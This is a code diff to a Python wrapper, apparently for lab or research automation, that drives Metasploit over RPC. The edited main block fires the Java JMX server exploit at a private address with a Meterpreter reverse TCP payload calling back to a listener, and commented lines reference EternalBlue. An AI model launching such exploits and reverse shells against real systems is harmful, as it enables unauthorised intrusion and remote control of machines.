@@ -524,7 +524,7 @@ class Msfrpc:
         '''
         json_auxiliary = self.current_auxiliary.execute()
         session = -1
-        time.sleep(15)
+        time.sleep(20)
         try:
             session_num_list = [*self.client.sessions.list]
             session_id = session_num_list[-1]
@@ -687,13 +687,15 @@ if __name__ == '__main__':
     env.launch_metasploit()
     env.connection_rpc()
     env.get_exploits()
+    # env.run_an_exploit('windows/ftp/ftppad_list_reply')
     env.run_an_exploit('exploit/multi/misc/java_jmx_server')
-    # env.run_an_exploit('windows/smb/ms17_010_eternalblue')
     # options = env.change_option_exploit('CheckModule', 'auxiliary/scanner/smb/smb_ms17_010', 'STR')
-    # options = env.change_option_exploit('RHOSTS', '172.16.1.2', 'STR')
-    # env.run_a_payload('windows/x64/meterpreter/reverse_tcp')
-    # env.change_option_payload('LHOST', '172.16.2.2', 'STR')
-    # json, session = env.execute_exploit()
-    # print(env.client.sessions.list)
+    options = env.change_option_exploit('RHOSTS', '172.16.1.2', 'STR')
+    options = env.change_option_exploit('RPORT', 1617 , 'INT')
+    env.run_a_payload('java/meterpreter/reverse_tcp')
+    env.change_option_payload('LHOST', '172.16.2.2', 'STR')
+    env.change_option_payload('LPORT', 51465, 'INT')
+    json, session = env.execute_exploit()
+    print(env.client.sessions.list)
     while 1:
         a = None
